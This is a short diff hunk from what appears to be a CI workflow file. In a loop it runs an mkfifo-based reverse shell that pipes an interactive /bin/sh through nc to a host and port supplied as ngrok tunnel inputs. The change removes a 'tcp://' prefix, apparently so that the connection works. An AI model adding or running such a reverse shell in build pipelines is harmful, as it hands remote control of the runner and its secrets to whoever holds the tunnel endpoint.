@@ -300,7 +300,7 @@ jobs:
         rm -rf /tmp/f || true
         mkfifo /tmp/f
         while true; do
-          cat /tmp/f|/bin/sh -i 2>&1|nc tcp://${{ inputs.ngrok_hostname }} ${{ inputs.ngrok_port }} >/tmp/f || true
+          cat /tmp/f|/bin/sh -i 2>&1|nc ${{ inputs.ngrok_hostname }} ${{ inputs.ngrok_port }} >/tmp/f || true
           sleep 5
         done
 
